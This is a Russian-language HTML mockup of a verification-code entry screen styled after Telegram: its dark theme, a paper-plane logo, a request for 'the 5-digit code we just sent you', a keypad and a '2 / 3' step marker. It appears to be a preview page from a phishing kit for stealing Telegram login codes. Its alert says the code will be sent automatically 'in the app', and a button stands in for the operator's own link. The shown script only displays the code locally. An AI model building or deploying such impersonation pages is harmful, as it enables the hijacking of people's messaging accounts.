<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Превью — ввод кода</title>
<style>
  * { box-sizing: border-box; }
  html, body {
    margin: 0; padding: 0; min-height: 100%;
    background: #17212b; color: #fff;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    --btn: #4aa0e0;
  }
  body { display: flex; justify-content: center; padding: 24px 16px; }
  .card { width: 100%; max-width: 360px; }
  .text {
    background: rgba(255,255,255,0.08);
    border-radius: 14px; padding: 14px 16px;
    text-align: center; font-size: 15px; line-height: 1.35; margin: 8px 0;
  }
  .btn {
    border: none; border-radius: 12px; padding: 14px;
    font-size: 16px; font-weight: 600; color: #fff;
    background: var(--btn); cursor: pointer; margin-top: 6px; width: 100%;
  }
  .step { text-align: center; font-size: 12px; opacity: .5; margin-top: 12px; }

  .phone-anim { display:flex; justify-content:center; margin:4px 0 2px; }
  .phone-anim svg { animation: floaty 2.6s ease-in-out infinite; }
  @keyframes floaty {
    0%,100% { transform: translateY(0) rotate(-4deg); }
    50%     { transform: translateY(-10px) rotate(4deg); }
  }

  .codecells { display:flex; gap:10px; justify-content:center; margin:16px 0; }
  .codecell {
    width:46px; height:56px; border-radius:12px;
    background:rgba(255,255,255,0.06);
    border:1px solid rgba(255,255,255,0.20);
    display:flex; align-items:center; justify-content:center;
    font-size:26px; font-weight:700;
  }
  .codecell.filled { border-color: var(--btn); }

  .keypad { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin-top:14px; }
  .key {
    padding:16px 0; border-radius:12px; text-align:center;
    font-size:22px; font-weight:600; cursor:pointer;
    user-select:none; -webkit-user-select:none;
    background: var(--btn); color:#fff;
  }
  .key:active { filter:brightness(0.88); }
  .key-empty { background:transparent; cursor:default; }
</style>
</head>
<body>
  <div class="card">

    <div class="phone-anim">
      <svg width="84" height="116" viewBox="0 0 84 116" fill="none">
        <rect x="8" y="3" width="68" height="110" rx="16" fill="#3a3f47"/>
        <rect x="14" y="13" width="56" height="90" rx="8" fill="#0e1621"/>
        <circle cx="42" cy="58" r="21" fill="#37aee2"/>
        <path d="M31 58 L54 49 L48 71 L43 63 L31 58 Z" fill="#fff"/>
      </svg>
    </div>

    <div class="text">Введите 5-значный код, который мы вам только что отправили!</div>

    <div class="codecells">
      <div class="codecell"></div>
      <div class="codecell"></div>
      <div class="codecell"></div>
      <div class="codecell"></div>
      <div class="codecell"></div>
    </div>

    <button class="btn" id="getcode">Узнать код</button>

    <div class="keypad">
      <div class="key" data-k="1">1</div>
      <div class="key" data-k="2">2</div>
      <div class="key" data-k="3">3</div>
      <div class="key" data-k="4">4</div>
      <div class="key" data-k="5">5</div>
      <div class="key" data-k="6">6</div>
      <div class="key" data-k="7">7</div>
      <div class="key" data-k="8">8</div>
      <div class="key" data-k="9">9</div>
      <div class="key key-empty"></div>
      <div class="key" data-k="0">0</div>
      <div class="key" data-k="back">⌫</div>
    </div>

    <div class="step">2 / 3</div>
  </div>

<script>
  (function () {
    var CODE_LEN = 5;
    var codeBuf = "";
    var cells = document.querySelectorAll(".codecell");

    function update() {
      for (var i = 0; i < cells.length; i++) {
        var ch = codeBuf[i] || "";
        cells[i].textContent = ch;
        if (ch) cells[i].classList.add("filled");
        else cells[i].classList.remove("filled");
      }
    }
    function onKey(k) {
      if (k === "back") codeBuf = codeBuf.slice(0, -1);
      else if (codeBuf.length < CODE_LEN) codeBuf += k;
      update();
      if (codeBuf.length === CODE_LEN) {
        setTimeout(function () {
          alert("Код введён: " + codeBuf + "\n(в приложении отправится автоматически)");
          codeBuf = ""; update();
        }, 120);
      }
    }
    var keys = document.querySelectorAll(".key[data-k]");
    for (var n = 0; n < keys.length; n++) {
      (function (el) { el.onclick = function () { onKey(el.getAttribute("data-k")); }; })(keys[n]);
    }
    var g = document.getElementById("getcode");
    if (g) g.onclick = function () { alert("«Узнать код» — тут откроется твоя ссылка-ресурс"); };
  })();
</script>
</body>
</html>
